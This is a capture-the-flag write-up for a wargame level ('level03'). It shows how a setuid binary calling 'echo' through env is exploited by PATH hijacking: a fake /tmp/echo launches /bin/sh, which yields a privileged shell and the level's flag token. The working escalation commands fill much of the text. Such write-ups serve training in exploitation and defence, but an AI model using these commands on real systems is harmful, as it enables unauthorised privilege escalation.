# level03

1. Files found in `~/` :

```bash
./level03
```

File : `./level03` belonging to `flag03`

2. Binary analysis

```bash
chmod +x level03
./level03
Exploit me
```

Binary inspection with strings and file :

```bash
file level03
strings -n 6 level03 | grep echo
```

The binary uses echo from its PATH in the environment and has the rights of its creator (setuid / setgid).

```bash
setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

```bash
/usr/bin/env echo Exploit me
```

3. Exploitation

Redirect echo to a command prompt in order to launch `getflag`.

```bash
echo '/bin/sh' > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
getflag
```

4. Token discovered

The token is : `qi0maab88jeaj46qoumi7maus`
